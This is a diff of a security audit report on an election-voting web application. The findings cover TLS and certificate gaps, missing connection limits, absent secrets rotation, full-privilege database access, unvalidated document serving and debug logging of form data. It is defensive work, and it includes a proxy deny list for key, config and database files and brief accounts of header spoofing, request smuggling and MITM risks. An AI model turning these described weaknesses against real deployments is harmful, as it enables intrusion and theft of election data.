-The application serves per-issue documents directly to authenticated users without any antivirus or malware scanning. Files are served from the DOCSDIR/{iid}/ directory structure and referenced in issue descriptions using the doc:filename syntax, which is converted into clickable download links. Files placed in the docs directory (whether by admin CLI scripts, manual upload, or an upload mechanism not shown in these files) are served directly to authenticated users without malware scanning. A malicious document (e.g., a PDF with embedded exploit, a malware-laden Office document, or an HTML file with scripts) placed in the docs directory would be served to all voters authorized for that issue.
+**Description:**
+
+No OCSP stapling is configured for the TLS server. If a server certificate is compromised and revoked, clients will not be efficiently informed of the revocation status. Without OCSP stapling: Clients must perform their own OCSP lookups (slower, privacy-leaking), many clients soft-fail OCSP checks meaning revoked certificates may still be accepted, and the development configuration uses self-signed certificates (where OCSP is not applicable), but production deployments need this.
 
 **Remediation:**
 
-Implement antivirus scanning using ClamAV at serving time or at ingestion time. For serving time, integrate clamdscan to scan files before delivery with fail-closed behavior if scanner is unavailable. Add file extension whitelisting to restrict allowed document types (e.g., .pdf, .txt, .md, .html). Implement periodic background scanning of the docs directory to catch files that may have been clean at upload but later identified as malicious. Add a quarantine mechanism for suspicious files and log all scan results for security monitoring.
+For production deployment with Hypercorn, configure OCSP stapling in the SSL context by creating an SSL context with minimum TLS version 1.2, loading the certificate chain, and enabling OCSP stapling if response is available. For Hypercorn-based deployment, add ssl configuration to hypercorn.toml with certfile and keyfile paths, and configure a reverse proxy (nginx/Apache) with OCSP stapling enabled. Note that full OCSP stapling requires periodic refresh of the OCSP response.
 
 ---
 
-#### FINDING-172: No evidence of header trust boundary enforcement
+#### FINDING-153: Self-Signed Certificates Used with No Pathway to Publicly Trusted Certificates for External-Facing Services
 
 | Attribute | Value |
 |-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2, L3 |
-| **CWE** | - |
-| **ASVS Sections** | 4.1.3 |
-| **Files** | v3/server/api.py:1-21 |
-| **Source Reports** | 4.1.3.md |
-| **Related** | - | **Description:**
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L1 |
+| CWE | |
+| ASVS sections | 12.2.2 |
+| Files | v3/server/config.yaml.example:25-31, v3/docs/quickstart.md:49-53 |
+| Source Reports | 12.2.2.md |
+| Related | |
 
-The file imports and exposes `APP` from `asfquart` without any visible configuration to strip or reject user-supplied intermediary headers (e.g., `X-Forwarded-For`, `X-Real-IP`, `X-User-ID`). While the `asfquart` framework may handle this internally, there is no visible control in the auditable codebase to confirm that end-users cannot inject headers that would be trusted as if set by intermediaries. Data flow: External HTTP request → `X-Forwarded-For` header → `APP` request handling → potential trust of user-supplied value as intermediary-set value. If `asfquart` or downstream handlers trust these headers without validation, an attacker could spoof their IP address or identity for access control bypass or audit log pollution.
+**Description:**
+
+The example configuration and documentation exclusively reference self-signed certificates. While the architecture document mentions 'Typical usage is that a proxy sits in front of this server,' there is: 1. No production configuration example with publicly trusted certificates 2. No documentation on deploying with publicly trusted TLS certs 3. No validation that configured certificates are publicly trusted 4. The certs/ directory structure implies certificate storage alongside code. External-facing clients (voters, administrators) connecting directly to this service would encounter certificate warnings or be vulnerable to MITM attacks if self-signed certificates are used in production.
 
 **Remediation:**
 
-Configure the application or its framework to explicitly define trusted proxy sources and strip/ignore intermediary headers from untrusted origins. Example: Configure trusted proxies using APP.config['FORWARDED_ALLOW_IPS'] = '127.0.0.1,10.0.0.0/8' or use middleware to strip untrusted headers. This finding is classified as MEDIUM rather than CRITICAL because the control may exist in `asfquart` but cannot be verified from the provided source.
+Provide a production configuration example using Let's Encrypt or other CA-signed certificates. Add deployment documentation requiring publicly trusted certificates for production. Consider integrating ACME (Let's Encrypt) certificate provisioning. Example production config: server: port: 443, certfile: /etc/letsencrypt/live/voting.example.org/fullchain.pem, keyfile: /etc/letsencrypt/live/voting.example.org/privkey.pem
 
 ---
 
-#### FINDING-173: No visible HTTP message boundary validation or Transfer-Encoding/Content-Length conflict handling
+#### FINDING-154: No TLS Enforcement in ASGI Deployment Mode
 
 | Attribute | Value |
 |-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2, L3 |
-| **CWE** | - |
-| **ASVS Sections** | 4.2.1 |
-| **Files** | v3/server/api.py:1-21 |
-| **Source Reports** | 4.2.1.md |
-| **Related** | - | **Description:**
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L1 |
+| CWE | |
+| ASVS sections | 12.2.1 |
+| Files | v3/server/main.py:88-108 |
+| Source Reports | 12.2.1.md |
+| Related | |
 
-The file provides no configuration related to HTTP/1.1 request smuggling prevention. There is no visible rejection of requests with both Transfer-Encoding and Content-Length headers, HTTP/2 DATA frame length validation against Content-Length, or configuration ensuring the application server and reverse proxy agree on message boundaries. If the reverse proxy and Quart/Hypercorn disagree on how to parse the request boundary (e.g., one uses Content-Length while the other uses Transfer-Encoding), an attacker could smuggle a second request that bypasses authentication or access controls.
+**Description:**
+
+When running in ASGI mode (production deployment via Hypercorn), TLS configuration is entirely delegated to the external ASGI server. There is no validation or enforcement within the application that TLS is being used. The application code does not verify that the ASGI server has TLS configured, set any TLS-related response headers (HSTS), reject non-HTTPS requests, or check X-Forwarded-Proto when behind a proxy.
 
 **Remediation:**
 
-1. Configure the reverse proxy to normalize requests (reject ambiguous requests with both TE and CL). 2. Configure the ASGI server (Hypercorn) to reject malformed requests. 3. Add application-level validation using @APP.before_request to reject requests with both Transfer-Encoding and Content-Length headers by aborting with 400 status and 'Ambiguous message framing' message.
+Add middleware to enforce HTTPS in ASGI mode. Implement @APP.before_request handler to check both quart.request.is_secure and X-Forwarded-Proto header, aborting with 403 if neither indicates HTTPS. Document required TLS configuration for Hypercorn and proxy deployments.
 
 ---
 
-#### FINDING-174: Mixed logging mechanisms (print vs logger) create undocumented output channels
+#### FINDING-155: No Visible TLS Certificate Validation for Outbound OAuth Connections
 
 | Attribute | Value |
 |-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2 |
-| **CWE** | - |
-| **ASVS Sections** | 16.1.1, 16.2.3 |
-| **Files** | v3/server/pages.py:427, v3/server/pages.py:449, v3/server/bin/tally.py:127, v3/server/bin/tally.py:152, v3/server/bin/tally.py:157 |
-| **Source Reports** | 16.1.1.md, 16.2.3.md |
-| **Related** | - | **Description:**
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L2 |
+| CWE | |
+| ASVS sections | 12.3.2 |
+| Files | v3/server/main.py:44-49 |
+| Source Reports | 12.3.2.md |
+| Related | |
 
-Multiple code paths use print() statements alongside the formal _LOGGER system. These bypass any logging framework configuration (formatters, handlers, filters, destinations) and output to stdout directly, creating undocumented log channels that cannot be inventoried. Security-relevant information (form submissions, tamper detection alerts) exits through channels not covered by any logging policy, potentially being lost or logged without proper access controls.
+**Description:**
+
+The application makes outbound HTTPS connections to oauth.apache.org for authentication. The actual HTTP client implementation is within asfquart (not provided), and there is no visible code confirming: 1. TLS certificate validation is enabled (not verify=False), 2. Certificate chain is validated against system trust store, 3. Hostname verification is performed. While Python's urllib/requests/httpx default to validating certificates, custom HTTP clients or misconfiguration could disable this. If certificate validation is disabled or improperly configured in the asfquart OAuth client, the application would be vulnerable to MITM attacks during the OAuth flow, potentially allowing token theft or session hijacking.
 
 **Remediation:**
 
-Replace print statements with proper logging. For form data, use _LOGGER.debug() with structured identifiers. For security events like tamper detection, use _LOGGER.critical() with clear event descriptions. Example: _LOGGER.critical(f'TAMPER DETECTED: Election[E:{election_id}] integrity check failed')
+Verify that the asfquart library's HTTP client has certificate validation enabled. Add explicit configuration to enforce certificate verification: import httpx; async with httpx.AsyncClient(verify=True) as client: response = await client.get(oauth_url)
 
 ---
 
-#### FINDING-175: Authorization failure events lack structured metadata
+#### FINDING-156: Self-Signed Certificates for Internal/Development Use with No Trust Management
 
 | Attribute | Value |
 |-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2 |
-| **CWE** | - |
-| **ASVS Sections** | 16.2.1 |
-| **Files** | v3/server/pages.py:199-201 |
-| **Source Reports** | 16.2.1.md |
-| **Related** | - | **Description:**
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L2 |
+| CWE | |
+| ASVS sections | 12.3.4 |
+| Files | v3/docs/quickstart.md:49-53, v3/server/config.yaml.example:25-31 |
+| Source Reports | 12.3.4.md |
+| Related | |
+
+**Description:**
+
+The system uses self-signed certificates but there is no: 1. Internal CA configuration or documentation 2. Trust store management for consuming services 3. Certificate pinning for internal connections 4. Guidance on which specific self-signed certificates should be trusted by clients/proxies. If the reverse proxy connects to this backend, it would need to trust the self-signed certificate. Without a specific internal CA or pinning configuration, this creates a risk that any self-signed certificate could be accepted. A consuming service (reverse proxy) configured to trust "any" self-signed certificate or to skip validation when connecting to this backend would be vulnerable to MITM attacks on the internal network.
+
+**Remediation:**
+
+Establish an internal CA and document certificate provisioning. Configure the reverse proxy to pin the specific backend certificate or trust only the internal CA. Example nginx proxy configuration: upstream backend { server localhost:58383; } server { location / { proxy_pass https://backend; proxy_ssl_trusted_certificate /etc/nginx/internal-ca.pem; proxy_ssl_verify on; } }
+
+---
+
+#### FINDING-157: Incomplete documentation of application communication needs
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L2 |
+| CWE | |
+| ASVS sections | 13.1.1 |
+| Files | v3/ARCHITECTURE.md, v3/docs/schema.md, v3/server/config.yaml.example, v3/server/main.py:36-40, v3/server/bin/mail-voters.py:67-73, v3/steve/election.py:37, v3/server/pages.py:560-574 |
+| Source Reports | 13.1.1.md |
+| Related | |
+
+**Description:**
+
+The application communicates with multiple external services, but there is no comprehensive communication inventory document. The following communication channels were identified through code analysis but are not formally documented in a single reference: 1) ASF OAuth Service (external authentication) at oauth.apache.org, 2) SMTP/Email Service (voter notification), 3) SQLite Database (local persistence), 4) LDAP Service (authorization, referenced but not implemented), 5) End-user-provided document filenames (potential SSRF vector). Without comprehensive communication documentation, security teams cannot perform complete threat modeling, firewall rule validation, or network segmentation reviews. Undocumented external dependencies may introduce unmonitored attack surfaces.
+
+**Remediation:**
+
+Create a dedicated COMMUNICATIONS.md or equivalent document that inventories: All external service endpoints (OAuth, SMTP, LDAP), Protocol, port, and authentication method for each, Direction of communication (inbound/outbound), User-controllable endpoints or file references, Network security requirements (TLS versions, cipher suites)
+
+---
+
+#### FINDING-158: No documentation of concurrent connection limits or fallback mechanisms for any service
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L3 |
+| CWE | |
+| ASVS sections | 13.1.2 |
+| Files | v3/ARCHITECTURE.md, v3/steve/election.py:35-44, v3/server/pages.py:165-186, 297 |
+| Source Reports | 13.1.2.md |
+| Related | |
+
+**Description:**
+
+The application interacts with multiple services (SQLite, OAuth, SMTP) but there is no documentation defining maximum concurrent connections, connection pool limits, or behavior when those limits are reached. Database connections are opened per-operation without pooling. Each Election() instantiation opens a new database connection. Web handlers create new Election/PersonDB instances per request without connection management. ARCHITECTURE.md mentions connections without limits. No documentation exists for maximum concurrent SQLite connections, OAuth service connection timeouts/limits, SMTP connection pooling or rate limits, or fallback behavior if any service becomes unavailable. Under high load or during service outages, the application may exhaust file descriptors, memory, or other resources. Without defined limits and fallback mechanisms, a denial-of-service condition could result from legitimate traffic spikes or upstream service degradation.
+
+**Remediation:**
+
+Document for each service: connection pool size or maximum concurrent connections, queue/backpressure behavior when limits are reached, circuit breaker or fallback patterns. Example configuration: database.max_connections: 10, database.connection_timeout_ms: 5000, database.behavior_at_limit: queue (or reject), oauth.max_concurrent_requests: 5, oauth.timeout_ms: 10000, oauth.fallback: deny_login, smtp.max_concurrent_sends: 3, smtp.retry_on_failure: false
+
+---
+
+#### FINDING-159: No documented resource-management strategies, timeout settings, or retry logic for external services
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L3 |
+| CWE | |
+| ASVS sections | 13.1.3 |
+| Files | v3/ARCHITECTURE.md, v3/steve/election.py, v3/server/main.py:37-40, v3/server/bin/mail-voters.py:67-73, v3/server/pages.py:165-186 |
+| Source Reports | 13.1.3.md |
+| Related | |
+
+**Description:**
+
+The application documentation does not define resource-management strategies for any external system. Code analysis reveals the following gaps: 1) No timeout settings for database operations (SQLite's default timeout for busy/locked databases is 5 seconds, but this is never explicitly configured or documented). 2) No resource-release procedures documented (Database connections are released in some cases but not others. Connections are closed in delete() method but normal request-serving paths via load_election decorator never explicitly close connections). 3) Email sending has no retry or timeout configuration (The mail-voters.py script sends emails without timeout, retry configuration, or error handling per recipient). 4) OAuth callback has no documented timeout (OAuth callback URL has no timeout or failure handling documented). 5) No retry limits, delays, or back-off algorithms documented anywhere. Without defined resource management strategies: Database locks could cause indefinite hangs under concurrent access, Failed email sends could silently drop voter notifications, OAuth service outages could leave requests hanging, Resource leaks from unclosed connections could degrade availability over time.
+
+**Remediation:**
+
+Create a resource management section in documentation covering: SQLite Database (Timeout: 30 seconds via sqlite3 timeout parameter, Release: Connections closed after each request via context manager, Failure handling: Return 503 if database is locked beyond timeout, Retry: No retries for synchronous operations); OAuth/ASF OAuth (Timeout: 10 seconds for token exchange, Retry: None - redirect user to retry login, Failure handling: Display error page with retry option); SMTP/Email (Timeout: 30 seconds per message, Retry: Up to 2 retries with 5-second delay, Back-off: Not applicable for batch script, Failure handling: Log error, continue to next recipient)
+
+---
+
+#### FINDING-160: No secrets rotation schedule or lifecycle management documentation
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L3 |
+| CWE | |
+| ASVS sections | 13.1.4 |
+| Files | v3/docs/schema.md, v3/steve/crypto.py:27-29, 32-41, v3/server/config.yaml.example, v3/server/pages.py:83 |
+| Source Reports | 13.1.4.md |
+| Related | |
+
+**Description:**
+
+While the application documents what secrets exist and how they are generated, there is no documentation defining a rotation schedule or lifecycle management for any secret. Secrets identified in the system include: 1) Election salts (16 bytes) generated once at election opening, never rotated; 2) Mayvote salts (16 bytes) generated once at election opening, never rotated; 3) Opened keys (32 bytes) derived once for tamper detection; 4) TLS certificate private keys with path documented but no rotation; 5) Session secrets managed by asfquart, not documented; 6) OAuth client credentials referenced but not documented; 7) CSRF tokens currently placeholder ('placeholder'), not a real secret. What's documented: Salt field purposes and generation method, key derivation algorithm (Argon2), encryption algorithm (Fernet, planned migration to XChaCha20-Poly1305). What's missing: Rotation schedule for TLS certificates, rotation procedures if election salts are compromised, session secret rotation policy, OAuth credential rotation, impact assessment if any secret is compromised, classification of secrets by criticality. Without a defined rotation schedule, compromised secrets may remain in use indefinitely. The placeholder CSRF token represents a complete absence of this security control, which could allow cross-site request forgery attacks.
+
+**Remediation:**
+
+Create a secrets management document with the following structure: Secrets Inventory and Rotation Schedule table including: Secret, Criticality, Rotation Schedule, Rotation Procedure. Specific recommendations: TLS private key (Critical) - Annual or on compromise, re-issue certificate, deploy, restart; Session signing key (High) - Monthly, update config, restart server; OAuth client secret (High) - Annual, coordinate with ASF OAuth team; Election salts (Medium) - N/A (single-use per election lifecycle), cannot rotate once election opened; CSRF tokens (High) - Per-session, automatically generated per session. Include Compromise Response section: If TLS key compromised: Revoke certificate immediately, re-issue; If session key compromised: Rotate key, invalidate all sessions; If election salt compromised: Election integrity may be violated; re-run if possible.
+
+---
+
+#### FINDING-161: All application components use identical full-privilege database access
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L2 |
+| CWE | |
+| ASVS sections | 13.2.2 |
+| Files | v3/steve/election.py:35-37, v3/steve/persondb.py:25-26, v3/server/bin/create-election.py:31, v3/server/bin/mail-voters.py:28, v3/server/pages.py:40 |
+| Source Reports | 13.2.2.md |
+| Related | |
+
+**Description:**
+
+All application modules — web handlers, business logic, command-line tools — access the SQLite database with the same full read/write permissions. There is no privilege separation. Web request handlers, Election model, PersonDB, and CLI tools all use identical database access patterns with full permissions. Specific concerns include: (1) The mail-voters.py script only needs READ access to election metadata and voter emails, but has full write access to the database, (2) The voter-facing endpoints (e.g., /vote-on/&lt;eid&gt;) can technically invoke any database operation (create elections, delete data) since the same Election class is used, (3) No OS-level service account separation between the web server and CLI tools. If any component is compromised (e.g., through a web vulnerability), the attacker gains full database access including ability to modify election results, delete elections, or alter voter records. The mail-voters.py script could be leveraged to modify data if compromised.
+
+**Remediation:**
+
+1. For SQLite: Implement application-level privilege separation by using different database wrapper classes with restricted query sets (example provided: VoterDB class with read-only access and ALLOWED_QUERIES whitelist). 2. For CLI tools, use read-only database connections where write access is not needed (example: mail-voters.py should use sqlite3.connect with mode=ro). 3. Document the principle of least privilege for each component and its required access level.
+
+---
+
+#### FINDING-162: No allowlist defined for outbound resource access or file system access patterns
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L2 |
+| CWE | |
+| ASVS sections | 13.2.4 |
+| Files | v3/server/pages.py:560-574 |
+| Source Reports | 13.2.4.md |
+| Related | |
+
+**Description:**
+
+User-supplied docname URL parameter is passed to quart.send_from_directory(DOCSDIR / iid, docname) for file system access with no allowlist of permitted file types or names. While send_from_directory typically prevents path traversal, there is no allowlist of permitted document types/names. The comment '### verify the propriety of DOCNAME.' explicitly acknowledges this gap. Without an allowlist of permitted document types/names, any file placed in the DOCSDIR/iid/ directory could be served, and the intent of the developer (per the TODO comment) was clearly to restrict this further.
+
+**Remediation:**
+
+Implement an allowlist of permitted document extensions (e.g., ALLOWED_DOC_EXTENSIONS = {'.pdf', '.txt', '.md', '.html'}). Validate docname against this allowlist by checking the file extension. Ensure no path separators ('/', '\\', '..') are present in docname. Example code provided in finding validates extension and rejects path separators.
+
+---
+
+#### FINDING-163: Database connections opened without documented configuration for timeouts, connection limits, or retry strategies
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L3 |
+| CWE | |
+| ASVS sections | 13.2.6 |
+| Files | v3/steve/election.py:36, v3/steve/persondb.py:27, v3/server/pages.py:567 |
+| Source Reports | 13.2.6.md |
+| Related | |
+
+**Description:**
+
+Multiple call sites open database connections through asfpy.db.DB() without timeout, pool limit, or retry configuration. No connection timeout means requests could hang indefinitely if the database file becomes locked. No maximum connection limit means concurrent requests could exhaust file handles. No retry strategy means transient failures (e.g., WAL checkpoint) cause immediate errors. Database connections are opened per-request without pooling.
+
+**Remediation:**
+
+Implement configuration constants for DB_TIMEOUT (30 seconds), DB_MAX_CONNECTIONS (10), DB_RETRY_ATTEMPTS (3), and DB_RETRY_DELAY (0.5 seconds). Set PRAGMA busy_timeout on connections and enable WAL mode for better concurrency. Example: db.conn.execute('PRAGMA busy_timeout = 30000') and db.conn.execute('PRAGMA journal_mode = WAL').
+
+---
+
+#### FINDING-164: Internal _all_metadata() method exposes SALT and OPENED_KEY to any code with Election object access
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L2 |
+| CWE | |
+| ASVS sections | 13.3.2 |
+| Files | v3/steve/election.py:130 |
+| Source Reports | 13.3.2.md |
+| Related | |
+
+**Description:**
+
+The _all_metadata() method is marked as 'INTERNAL ONLY' by convention (leading underscore and comment), but Python does not enforce access control. Any code with access to an Election instance can call election._all_metadata() to retrieve the salt and opened_key. The __getattr__ proxy method (line 48) further means that query cursors like q_metadata are directly accessible on the Election object. If authorization gaps exist (and they do — multiple ### check authz placeholders), any authenticated user who obtains an Election object could access sensitive cryptographic material through the internal API.
+
+**Remediation:**
+
+Return a wrapper object that prevents serialization of sensitive fields. Example implementation provided in finding creates _InternalMetadata class with __slots__ to prevent accidental exposure and redacted __repr__ for safe logging.
+
+#### FINDING-165: Per-voter-per-issue salt values have no expiration or rotation mechanism
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L3 |
+| CWE | - |
+| ASVS Sections | 13.3.4 |
+| Files | v3/schema.sql:130-139, v3/steve/election.py |
+| Source Reports | 13.3.4.md |
+| Related Findings | - |
+
+**Description:**
+
+Per-voter-per-issue salt values in the mayvote table have no expiration or rotation mechanism. These salts are critical for deriving vote_token and encryption keys. Once set during add_salts(), they remain unchanged for the lifetime of the database. The mayvote table stores salt values (16 bytes) that persist indefinitely with no lifecycle management.
+
+**Remediation:**
+
+Implement a key lifecycle policy that: (1) Documents expected lifetimes for all secret material, (2) Removes or re-encrypts key material after election finalization, (3) Implements automated cleanup of secrets past their useful life. Consider implementing secret rotation for long-running elections or a maximum election duration policy.
+
+---
+
+#### FINDING-166: Static file endpoint serves source control metadata
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L1 |
+| CWE | - |
+| ASVS Sections | 13.4.1 |
+| Files | v3/server/pages.py:577-578 |
+| Source Reports | 13.4.1.md |
+| Related Findings | - |
+
+**Description:**
+
+The /static/&lt;path:filename&gt; endpoint accepts paths with subdirectories (e.g., .git/config, .svn/entries). If a .git or .svn folder exists within STATICDIR (which could occur from development/deployment practices), it would be served to clients. While send_from_directory should prevent path traversal above the root, it will serve any file within the directory tree including source control metadata.
+
+**Remediation:**
+
+Add explicit blocking of source control metadata paths using a regex pattern to reject requests containing .git, .svn, .hg, or .bzr directory components. Example implementation provided in finding.
+
+---
+
+#### FINDING-167: Debug print() statements expose form data to stdout in production
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 13.4.2, 16.2.3, 16.5.1, 14.2.4 |
+| Files | v3/server/pages.py:476, v3/server/pages.py:497 |
+| Source Reports | 13.4.2.md, 16.2.3.md, 16.5.1.md, 14.2.4.md |
+| Related Findings | - |
+
+**Description:**
+
+Two endpoint handlers dump complete form data to stdout via print() statements. This creates an undocumented log channel that: 1) Bypasses the _LOGGER system and its configured handlers, 2) Is not subject to any log access controls, 3) May output to container stdout (captured by orchestrators), console, or wherever stdout is redirected, 4) Is not mentioned in any logging inventory (which doesn't exist per 16.1.1). Form data containing election titles, descriptions, and potentially sensitive organizational information is broadcast to an uncontrolled output stream. In containerized environments, stdout is typically captured and may be accessible to operators who should not see election configuration details.
+
+**Remediation:**
+
+Remove debug print statements and use structured logging with appropriate level. Example: Remove `print('FORM:', form)` and replace with `_LOGGER.debug(f'Adding issue to election[E:{election.eid}]')` without logging form content.
+
+---
+
+#### FINDING-168: No Server/Framework Version Header Suppression Configured
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L3 |
+| CWE | - |
+| ASVS Sections | 13.4.6 |
+| Files | v3/server/main.py:52, v3/server/main.py:94 |
+| Source Reports | 13.4.6.md |
+| Related Findings | - |
+
+**Description:**
+
+HTTP request → Hypercorn/asfquart server → HTTP response with default Server header → client receives version info. Hypercorn (used in ASGI mode, referenced in comments at line ~117) and the underlying framework typically include a Server header (e.g., Server: hypercorn-h11) in HTTP responses by default. This reveals the specific server technology, enabling targeted attacks against known vulnerabilities in that version. No configuration is present to suppress or override this header.
+
+**Remediation:**
+
+For Hypercorn, in hypercorn.toml or programmatically: server_names = [""]. Or add middleware to strip version headers: @app.after_request async def remove_version_headers(response): response.headers.pop('Server', None); response.headers.pop('X-Powered-By', None); return response
+
+---
+
+#### FINDING-169: Sensitive Files Co-located With Application Without Explicit Web Tier File Extension Filtering
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L3 |
+| CWE | - |
+| ASVS Sections | 13.4.7 |
+| Files | v3/server/config.yaml.example, v3/server/main.py:27-28 |
+| Source Reports | 13.4.7.md |
+| Related Findings | - |
+
+**Description:**
+
+The application directory contains sensitive files including config.yaml (database path, TLS configuration), steve.db (SQLite database with all election data), certs/*.pem (TLS private keys), and *.py (source code). The config comment states 'a proxy sits in front of this server' (line ~23 of config.yaml.example), but no proxy configuration with file extension allowlisting is provided. If the proxy is misconfigured to serve files from the application directory, all these sensitive files become accessible.
+
+**Remediation:**
+
+Provide and enforce proxy configuration with explicit file extension allowlisting. Example nginx configuration: Block direct file access with deny rules for extensions like .yaml, .yml, .db, .sqlite, .pem, .key, .py, .pyc, .cfg, .ini, .env, .git, .log. If static assets are needed, only allow specific extensions like .css, .js, .png, .jpg, .jpeg, .gif, .ico, .svg, .woff, .woff2.
+
+---
+
+#### FINDING-170: Incomplete formal data classification with protection levels
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 14.1.1 |
+| Files | v3/docs/schema.md:entire document |
+| Source Reports | 14.1.1.md |
+| Related Findings | - |
+
+**Description:**
+
+The schema documentation describes individual fields and their cryptographic properties, but does not formally classify data into distinct protection levels. While the document mentions that certain fields are "cryptographic" (salts, opened_key, vote_token, ciphertext), it does not establish a tiered classification system (e.g., Public / Internal / Confidential / Restricted) that maps each data element to a defined protection level. The following sensitive data items are described but not formally classified: Per-voter salts (mayvote.salt), Election salts (election.salt), Opened keys (election.opened_key), Vote ciphertext (vote.ciphertext), Vote tokens (vote.vote_token), Voter identities (mayvote.pid linking to person.pid), Person emails (person.email). Without formal classification, developers cannot consistently apply appropriate protection controls. Data that requires the highest level of protection (e.g., the linkage between voter identity and vote) may be treated identically to lower-sensitivity data (e.g., election titles). Compliance with privacy regulations (GDPR, etc.) requires documented data classification.
+
+**Remediation:**
+
+Create a formal data classification document that: 1. Defines protection levels (e.g., Public, Internal, Confidential, Restricted) 2. Maps each data element to a protection level 3. References applicable regulatory requirements. Example: Create a Data Classification table mapping vote.ciphertext to RESTRICTED level with ballot secrecy laws basis and encryption at rest controls; mayvote.salt to RESTRICTED level never logged or transmitted outside server; election.opened_key to CONFIDENTIAL level never exposed via API; mayvote.pid + iid linkage to CONFIDENTIAL level never exposed post-election with access logging; person.email to INTERNAL level with GDPR/Privacy basis and encryption at rest; election.title to PUBLIC level with standard web protections.
+
+---
+
+#### FINDING-171: No documented protection requirements per data sensitivity level
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 14.1.2 |
+| Files | v3/docs/schema.md:entire document |
+| Source Reports | 14.1.2.md |
+| Related Findings | - |
+
+**Description:**
+
+While the schema documentation describes what cryptographic mechanisms are used, it does not document the required set of protection controls for each sensitivity level. The ASVS requirement explicitly mandates documentation covering: encryption, integrity verification, retention, logging controls, access controls for sensitive data in logs, database-level encryption, privacy and privacy-enhancing technologies. Missing documentation areas include: data retention (NOT DOCUMENTED - no policy for closed elections, old votes, or person data), logging requirements (NOT DOCUMENTED - no specification of what can/cannot be logged), access controls for logs (NOT DOCUMENTED - no mention of log protection), database-level encryption (NOT DOCUMENTED - no requirement for filesystem/disk encryption). General encryption requirements and integrity verification are only partially documented (Fernet mentioned, XChaCha20 planned; opened_key for tamper detection). Privacy-enhancing technologies are partially documented (vote shuffling mentioned in code but not in docs).
+
+**Remediation:**
+
+Create a protection requirements document for each data level. For RESTRICTED data (votes, salts, opened_keys): Encryption using AES-256 equivalent (currently Fernet, migrating to XChaCha20-Poly1305); Integrity via Argon2-based tamper detection via opened_key comparison; Retention of encrypted votes until election results certified + 90 days, then purged; Logging to NEVER log plaintext votes, salts, or decryption keys, log only vote_token existence; Log access restricted to ops team for server logs containing election operations; Database encryption with SQLite database file on encrypted filesystem (LUKS/dm-crypt); Privacy via per-voter salts to prevent vote correlation and votes shuffled before tallying. For CONFIDENTIAL data (voter identities, emails, voter-issue linkages): Encryption protected by TLS in transit, filesystem encryption at rest; Retention of person records while active in LDAP, removed 1 year after LDAP removal; Logging where PIDs may be logged for audit but emails MUST NOT be logged; Access where voter-issue linkages accessible only to election owner during open state.
+
+---
+
+#### FINDING-172: Exception objects logged in error handler may contain sensitive cryptographic context
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L2 |
+| CWE | - |
+| ASVS Sections | 14.2.4 |
+| Files | v3/server/pages.py:do_vote_endpoint |
+| Source Reports | 14.2.4.md |
+| Related Findings | - |
+
+**Description:**
+
+If `election.add_vote()` fails during cryptographic operations (e.g., Fernet encryption, Argon2 hashing, HKDF derivation), the exception object may contain: partial key material in error context, salt values referenced in the traceback, internal state of cryptographic primitives, database query parameters including vote_tokens. This violates the requirement that sensitive data access in logs must be controlled. Data flow: Cryptographic operation failure → Exception message (may contain key material, salt values, or internal state) → `_LOGGER.error()` → server logs
+
+**Remediation:**
+
+Log only sanitized error information. Replace `_LOGGER.error(f'Error adding vote for user[U:{result.uid}] on issue[I:{iid}]: {e}')` with `_LOGGER.error(f'Error adding vote for user[U:{result.uid}] on issue[I:{iid}]: {type(e).__name__}')` and optionally `_LOGGER.debug(f'Vote error details: {e}')` for DEBUG level only, never in production.
+
+---
+
+#### FINDING-173: Authenticated document serving endpoint lacks cache-control headers and content-type validation
+
+| Attribute | Value |
+|-----------|-------|
+| Severity | 🟡 Medium |
+| ASVS Level(s) | L3 |
+| CWE | CWE-524 |
+| ASVS Sections | 14.2.5 |
+| Files | v3/server/pages.py:605-620 |
+| Source Reports | 14.2.5.md |
+| Related Findings | - |
+
+**Description:**
+
+The serve_doc() endpoint serves sensitive election documents to authenticated users but does not set cache-control headers or validate content types. If a caching layer (CDN, reverse proxy) sits in front of the application, authenticated responses could be cached and served to unauthorized users. The lack of Content-Type validation means responses may be cached under unexpected content types. Additionally, the docname parameter is not validated, potentially allowing path manipulation.
+
+**Remediation:**
+
+Validate docname parameter to only allow safe filenames using regex pattern. Set Cache-Control: no-store and X-Content-Type-Options: nosniff headers on the response before returning. Example: response.headers['Cache-Control'] = 'no-store' and response.headers['X-Content-Type-Options'] = 'nosniff'.
+
